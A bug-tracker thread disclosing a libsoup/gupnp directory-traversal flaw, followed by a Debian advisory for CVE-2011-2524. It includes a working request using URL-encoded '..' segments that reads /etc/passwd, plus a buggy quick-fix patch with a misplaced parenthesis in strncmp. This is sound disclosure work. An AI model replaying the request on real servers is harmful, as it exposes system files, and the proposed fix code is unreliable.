| [Description](show_bug.cgi?id=653258#c0)  Mike Holloway    2011-06-23 17:31:59 UTC  ``` While using gupnp which relies on libsoup, I saw a directory traversal attack was possible by url-encoding double-period segments (%2e) in the URI.   In libsoup/soup-uri.c, adding this code prevents the vulnerability for me as a quick-fix:                  /* Remove url-encoded ".." */                 for (p = uri->path + 1; *p; ) {                         if ( strncmp(p, "..", 2 == 0 ))                         {                                 memmove (p, p + 2, strlen (p + 2) + 1);                                 p = uri->path + 1;                         }                         else if                         (                                 strncmp (p, "%2e%2e", 6) == 0 ||                                 strncmp (p, "%2e%2E", 6) == 0 ||                                 strncmp (p, "%2E%2e", 6) == 0 ||                                 strncmp (p, "%2E%2E", 6) == 0                          )                         {                                 memmove (p, p + 2, strlen (p + 2) + 1);                                 p += 6;                         }                         else                                 p++;                 }                  /* Remove "./" where "." is a complete segment. */   Example of the vulnerability, connecting to a GUPnP server:  > # telnet 198.18.9.240 39137 > Trying 198.18.9.240... > Connected to 198.18.9.240. > Escape character is '^]'. > GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f > %2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.0 > > HTTP/1.0 200 OK > Date: Fri, 15 Oct 2010 14:51:37 GMT > Content-Type: text/plain > Accept-Ranges: bytes > Content-Length: 493 > > root:x:0:0:root:/root:/bin/sh   -mike ``` [Comment 1](show_bug.cgi?id=653258#c1)  Dan Winship    2011-06-24 14:02:05 UTC  ``` I can't reproduce this with tests/simple-httpd in the libsoup sources, and I can't figure out how to make gupnp's tests/test-server work. Can you provided more detailed instructions on how to reproduce? ``` [Comment 2](show_bug.cgi?id=653258#c2)  Mike Holloway    2011-06-24 16:27:37 UTC  ``` Here is a very basic UPnP server (borrowed from gupnp/examples/light-server.c ), it might be easier to get working:  #include <libgupnp/gupnp.h> #include <stdlib.h> #include <gmodule.h>  int main (int argc, char **argv) {   GMainLoop *main_loop;   GError *error = NULL;   GUPnPContext *context;   GUPnPRootDevice *dev;    g_thread_init (NULL);   g_type_init ();    /* Create the UPnP context */   context = gupnp_context_new (NULL, argv[1], 0, &error);   if (error) {     g_printerr ("Error creating the GUPnP context: %s\n",                 error->message);     g_error_free (error);      return EXIT_FAILURE;   }    /* Create root device */   dev = gupnp_root_device_new (context, "BinaryLight1.xml", "/tmp);   gupnp_root_device_set_available (dev, TRUE);     /* Run the main loop */   main_loop = g_main_loop_new (NULL, FALSE);   g_main_loop_run (main_loop);    /* Cleanup */   g_main_loop_unref (main_loop);   g_object_unref (dev);   g_object_unref (context);    return EXIT_SUCCESS; }   Copy that into gupnp-0.x.y/examples/server.c and compile, then copy the provided BinaryLight1.xml into your /tmp directory before launching the server with ' ./server eth0 '. If you don't work with UPnP much, which listens for broadcast packets and then unicasts back a response including the high random port to connect to the server on via HTTP, you can find the listening port of the server by doing your OS equivalent of 'netstat -ant'. Then try the telnet and GET above to that port. You could also just use a web browser instead of telnet.  -mike ``` [Comment 3](show_bug.cgi?id=653258#c3)  Dan Winship    2011-06-29 14:08:11 UTC  ``` Created [attachment 190933](attachment.cgi?id=190933 "SoupServer: fix to not allow smuggling \"..\" into path") [[details]](attachment.cgi?id=190933&action=edit "SoupServer: fix to not allow smuggling \"..\" into path") [[review]](review?bug=653258&attachment=190933) SoupServer: fix to not allow smuggling ".." into path  When SoupServer:raw-paths was set (the default), it was possible to sneak ".." segments into the path passed to the SoupServerHandler, which could then end up tricking some handlers into retrieving arbitrary files from the filesystem.

Package        : libsoup2.4
Vulnerability  : insufficient input sanitization
Problem type   : remote
Debian-specific: no
Debian bug     : 635837
CVE IDs        : CVE-2011-2524

It was discovered that libsoup2.4, a HTTP library implementation in C, is
not properly validating input when processing requests made to SoupServer.
A remote attacker can exploit this flaw to access system files via a
directory traversal attack.

For the oldstable distribution (lenny), this problem has been fixed in
version 2.4.1-2+lenny1.

For the stable distribution (squeeze), this problem has been fixed in
version 2.30.2-1+squeeze1.

For the testing distribution (squeeze), this problem has been fixed in
version 2.34.3-1.

For the unstable distribution (sid), this problem has been fixed in
version 2.34.3-1.

We recommend that you upgrade your libsoup2.4 packages.
